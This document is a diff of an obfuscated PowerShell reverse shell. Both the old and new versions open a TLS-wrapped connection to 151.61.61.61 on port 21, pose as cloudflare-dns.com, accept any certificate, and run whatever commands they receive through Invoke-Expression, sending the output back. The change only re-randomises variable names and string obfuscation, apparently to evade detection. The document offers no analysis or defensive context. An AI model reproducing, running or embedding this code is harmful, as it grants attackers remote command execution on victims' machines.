@@ -1,11 +1,11 @@
-$5a4b8056bda64f878f6c3c8942754ea3= [System.Security.Authentication.SslProtocols]::Tls12;
-$6e7252286ddf47b4b898266f7aae3ff7= Ne''w''-''O''b''je''ct Net.Sockets.TCPClient('151.61.61.61', 21);
-$5ec6fef9459e4f2d9819af6d11ba2100= $6e7252286ddf47b4b898266f7aae3ff7.GetStream();
-$fed74dabca05447189ba99fd92638e58= Ne''w''-''O''bj''e''c''t Net.Security.SslStream($5ec6fef9459e4f2d9819af6d11ba2100,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));
-$fed74dabca05447189ba99fd92638e58.AuthenticateAsClient('cloudflare-dns.com',$null,$5a4b8056bda64f878f6c3c8942754ea3,$false);
-if(!$fed74dabca05447189ba99fd92638e58.IsEncrypted -or !$fed74dabca05447189ba99fd92638e58.IsSigned) {$fed74dabca05447189ba99fd92638e58.Close();exit}$9e3aaf8cb0884a5f888e3dfe26471707 = New-Objec''t IO.StreamWriter($fed74dabca05447189ba99fd92638e58);
-function WriteToStream ($String) {[byte[]]$script:Buffer = N''e''w''-''O''b''j''e''c''t System.Byte[] 4096 ;
-$9e3aaf8cb0884a5f888e3dfe26471707.Write($String + 'SHELL> ');
-$9e3aaf8cb0884a5f888e3dfe26471707.Flush()};
+$dc7dd4bac35a46d8b2ca6c7d4b32f82f= [System.Security.Authentication.SslProtocols]::Tls12;
+$fb75e60388504260b53f3193fbe9bcc5= N''e''w''-''Ob''j''e''c''t Net.Sockets.TCPClient('151.61.61.61', 21);
+$71897e78bc80428bbdb5a6aa07d9733a= $fb75e60388504260b53f3193fbe9bcc5.GetStream();
+$07f6f6934b294c39a3f5b1055bdb4e06= Ne''w-Obje''c''t Net.Security.SslStream($71897e78bc80428bbdb5a6aa07d9733a,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));
+$07f6f6934b294c39a3f5b1055bdb4e06.AuthenticateAsClient('cloudflare-dns.com',$null,$dc7dd4bac35a46d8b2ca6c7d4b32f82f,$false);
+if(!$07f6f6934b294c39a3f5b1055bdb4e06.IsEncrypted -or !$07f6f6934b294c39a3f5b1055bdb4e06.IsSigned) {$07f6f6934b294c39a3f5b1055bdb4e06.Close();exit}$f6bf62f21fee416e904a6f60b87b377c = New-Objec''t IO.StreamWriter($07f6f6934b294c39a3f5b1055bdb4e06);
+function WriteToStream ($String) {[byte[]]$script:Buffer = New''-O''bject System.Byte[] 4096 ;
+$f6bf62f21fee416e904a6f60b87b377c.Write($String + 'SHELL> ');
+$f6bf62f21fee416e904a6f60b87b377c.Flush()};
 WriteToStream '';
-while(($929cc780381c4c5399cd14ea348456db = $fed74dabca05447189ba99fd92638e58.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$55ab998854e348b690537a1b0b5c3085= ([text.encoding]::UTF8).GetString($Buffer, 0, $929cc780381c4c5399cd14ea348456db - 1);$dedfd34f4eeb4cbdbee9aca699c6a9c4 = try {Invoke-Ex''p''r''e''s''sio''n $55ab998854e348b690537a1b0b5c3085 2>&1 | O''ut-''S''t''r''ing} catch {$_ | O''u''t''-''S''tr''i''ng}WriteToStream ($dedfd34f4eeb4cbdbee9aca699c6a9c4)}$9e3aaf8cb0884a5f888e3dfe26471707.Close()
+while(($a8be68b75aae469780b4fde8d6110793 = $07f6f6934b294c39a3f5b1055bdb4e06.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$aebd24568db94076897e3125a3a7599e= ([text.encoding]::UTF8).GetString($Buffer, 0, $a8be68b75aae469780b4fde8d6110793 - 1);$922fe2ce18ec4d14aa16a03babd82c51 = try {I''n''v''oke-E''xp''r''e''ssion $aebd24568db94076897e3125a3a7599e 2>&1 | O''u''t-''S''t''ri''n''g} catch {$_ | O''u''t''-''S''t''r''i''ng}WriteToStream ($922fe2ce18ec4d14aa16a03babd82c51)}$f6bf62f21fee416e904a6f60b87b377c.Close()
